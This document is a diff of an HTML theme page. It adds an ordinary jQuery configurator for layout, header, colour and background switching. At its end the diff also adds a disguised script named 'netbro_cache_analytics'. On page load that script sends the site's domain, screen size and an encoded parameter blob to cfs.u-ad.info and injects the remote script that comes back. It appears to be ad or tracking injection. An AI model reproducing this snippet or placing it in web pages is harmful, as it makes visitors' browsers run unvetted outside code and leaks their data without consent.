@@ -227,6 +227,94 @@ jQuery(window).load(function(){
 var retina = window.devicePixelRatio > 1 ? true : false;if(retina){var retinaEl = jQuery("#logo img");var retinaLogoW = retinaEl.width();var retinaLogoH = retinaEl.height();retinaEl.attr("src","upload/logo_retina.png").width(retinaLogoW).height(retinaLogoH)}});
 //]]>
 </script>
+
+<script>
+jQuery(document).ready(function($) {
+
+	// boxed fix
+		
+	// white/dark logo fix
+	
+	// show / hide
+	$('#configurator .control').click(function(e){
+		e.preventDefault();
+		if ($('#configurator').hasClass('active')){
+			$('#configurator').removeClass('active').animate({ 'left':-232 },500);
+		} else {
+			$('#configurator').addClass('active').animate({ 'left':-1 },500);
+		}
+	});
+
+	// layout select
+	$('#configurator .select-layout a').click(function(e){
+		e.preventDefault();
+		var newClass = $(this).attr('class');
+		$('body')
+			.removeClass('layout-full-width layout-boxed')
+			.addClass(newClass);
+		$(this)
+			.parent().addClass('active')
+			.siblings().removeClass('active');
+		if( newClass == 'layout-boxed' ) $('html').css('background-image','url("images/patterns/9.png")');
+		jQuery(window).resize();
+	});
+	
+	// action select
+	$('#configurator .select-action a').click(function(e){
+		e.preventDefault();
+		var action = $(this).attr('class');
+		if( action == 'show' ){
+			$('#Action_bar').show();	
+		} else {
+			$('#Action_bar').hide();
+		}	
+		$(this)
+			.parent().addClass('active')
+			.siblings().removeClass('active');
+	});
+	
+	// header select
+	$('#configurator .select-header a').click(function(e){
+		e.preventDefault();
+		var newClass 	= $(this).attr('data-rel');
+		var newLogo 	= $(this).attr('data-image');
+		$('body')
+			.removeClass('header-bg header-alpha header-white header-dark')
+			.addClass(newClass);
+			$("#logo img").attr('src','upload/logo.png');
+		$(this)
+			.parent().addClass('active')
+			.siblings().removeClass('active');
+	});
+
+	// color select
+	$('#configurator .select-color a').click(function(e){
+		e.preventDefault();
+		var value = $(this).attr('class');
+		if( value != 'default' ){
+			$('#configurator .inp-color').attr('name','mfn-c');
+		}
+		$('#configurator .inp-color').val(value);
+		$('#config').submit();
+	});
+
+	// bg select
+	$('#configurator .select-image a').click(function(e){
+		e.preventDefault();
+
+		var bg_attr = $(this).attr('data-rel');
+		var bg = 'url("'+ $(this).children('img').attr('src') +'") ' + bg_attr;
+		
+		$('html').css('background','none').css('background',bg);
+
+		// boxed layout
+		$('body').removeClass('layout-full-width').addClass('layout-boxed');
+	});
+
+});
+</script>	
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlR0cRq5t9HRFt5A4PM1ygrN7cfXDub8%2b7fE5AbiWo00xEVfWan6NM%2bQImeUlxTh1zEekQ7cnrXmB1hEh%2fHetBTyDVVaz1J74DtlrCYUqwv7eaRA5uzPrdJF0NUxcG1v%2f9Kx1U62DfMek%2beQB2L%2bXC1C7NCmrSXG4HN1zl%2bNUCQDqeysPEZrfZOLSXOMapoBDoiaPTazybmVK%2f79ojp1mmRQX5S%2bNOH4yB%2flM%2bpJNjtVWcFVfwbA0daXra%2fXy%2bTsOd3qXezxw4AS6lGvi9w55qwWnfaM8jfogKWvn19rtzhiqFIapTbZrZq8uO8kKerLriXGc22EQCcOe0BLvxcuG%2fLYEX94d4Tqp8G6AS61ak8FSUvZe458Ll1Ya6Zqq1ogaQF2tRExMgOMTNEq%2bVTQKPfOlTfe5YuxCTI%2b4aW%2fvaU%2fs9IIy9F2rdU2z1CxZEZRqx4mYXD3%2b9FrJ230f%2bm7S3vIiIDNSjDb8FoCXqh0Jma3OwiVGAhSclMD0un0j8in4Fz7BzMNhdnUPgCLLJT020knJfqzrWyvYQT2ryfFG7%2fk%2fkoFuqXBjTwDPkqDwqUrTEvvu1%2f%2bpw5T9Wt6jXKRLJg9QS7F8YrKhCBGI3kHA6vrzJcrCUxT%2b%2bGxA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
 	
 
 <script type="text/javascript">
